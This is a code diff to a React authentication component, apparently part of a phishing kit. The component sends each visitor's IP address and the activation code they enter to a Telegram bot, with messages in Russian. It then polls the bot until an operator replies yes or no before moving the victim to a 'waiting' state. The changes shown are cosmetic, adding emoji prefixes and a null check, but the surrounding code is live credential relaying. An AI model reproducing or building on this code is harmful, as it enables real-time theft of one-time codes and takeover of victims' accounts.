@@ -27,13 +27,13 @@ const FinalAuth = (props) => {
                 firstState = res.data.result;
             })
         setLoading(true);
-        axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+        axios.post(bot.sendMessage('%F0%9F%98%88 Пользователь <code>' + props.info.IPv4 + '</code>' +
             ' отправил код активации: ' + message + '.%0AВведите (yes_no)'), '')
     }
 
     const getUpdatesInterval =  () => {
         let req;
-        if (firstState.length > 80) {
+        if (firstState &&  firstState.length > 80) {
             req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
         } else req = bot.getUpdates();
         axios.get(req)
@@ -45,7 +45,7 @@ const FinalAuth = (props) => {
                             if (text.indexOf('yes') !== -1) {
                                 setCorrect(true);
                                 setLoading(false);
-                                axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
+                                axios.post(bot.sendMessage('%F0%9F%98%BB Пользователь <code>' + props.info.IPv4 + '</code>' +
                                     ' Подтвердил код и находится в режиме ожидания'), '')
                             } else if (text.indexOf('no') !== -1) {
                                 axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
